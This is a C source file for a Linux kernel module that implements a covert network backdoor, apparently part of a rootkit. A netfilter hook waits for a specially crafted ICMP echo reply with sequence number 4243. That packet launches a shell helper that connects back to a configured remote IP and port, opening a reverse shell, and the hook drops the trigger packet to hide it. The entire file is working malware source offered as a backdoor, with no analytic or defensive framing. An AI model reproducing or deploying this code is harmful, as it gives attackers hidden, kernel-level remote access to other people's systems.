#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/byteorder/generic.h>

#include "err.h"
#include "nf_hooks.h"


/* Remote ip/port for reverse shell */
static const char *r_ip = DEFAULT_IP;
static const char *r_port = DEFAULT_PORT;
/* Path to shell binary */
static const char *helper_path = DEFAULT_RSHELL_PATH;

static struct nf_hook_ops icmp_hook;

static inline void set_remote_ip(const char *ip)
{
	r_ip = ip;
}

static inline void set_remote_port(const char *port)
{
	r_port = port;
}

static inline void set_helper_path(const char *path)
{
	helper_path = path;
}

static int reverse_shell(const char *shell,
			 const char *ip,
			 const char *port)
{
	int ret;
	static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};
	static char *args[4];
	args[0] = (char *)shell;
	args[1] = (char *)ip;
	args[2] = (char *)port;
	args[3] = NULL;
	ret = call_usermodehelper(args[0], args, envp, UMH_NO_WAIT);
	return ret;
}

static unsigned int icmp_hookfn(void *priv,
				struct sk_buff *skb,
				const struct nf_hook_state *state)
{
	struct iphdr *iphdr;
	struct icmphdr *icmphdr;
	if (!skb) return NF_ACCEPT;
	iphdr = (struct iphdr *)skb_network_header(skb);
	if (!iphdr) {
		log_err("cannot retrieve ip hdr\n");
		return NF_ACCEPT;
	}
	if (iphdr->protocol != IPPROTO_ICMP)
		return NF_ACCEPT;
	icmphdr = (struct icmphdr *)skb_transport_header(skb);
	if (!icmphdr) {
		log_err("cannot retrieve icmp hdr\n");
		return NF_ACCEPT;
	}
	if (icmphdr->type == ICMP_ECHOREPLY
	    && icmphdr->code == ICMP_NET_ANO
	    && ntohs(icmphdr->un.echo.sequence) == 4243) {
		if (reverse_shell(helper_path, r_ip, r_port))
			log_err("problem happened dropping shell\n");
		return NF_DROP;
	}
	return NF_ACCEPT;
}

int register_backdoor(const char *ip, const char *port, const char *shell)
{
	icmp_hook.hook = icmp_hookfn;
	icmp_hook.pf = PF_INET;
	icmp_hook.hooknum = NF_INET_PRE_ROUTING;
	icmp_hook.priority = NF_IP_PRI_FIRST;
	if (ip)
		set_remote_ip(ip);
	if (port)
		set_remote_port(port);
	if (shell)
		set_helper_path(shell);
	return nf_register_hook(&icmp_hook);
}

void unregister_backdoor(void)
{
	nf_unregister_hook(&icmp_hook);
}
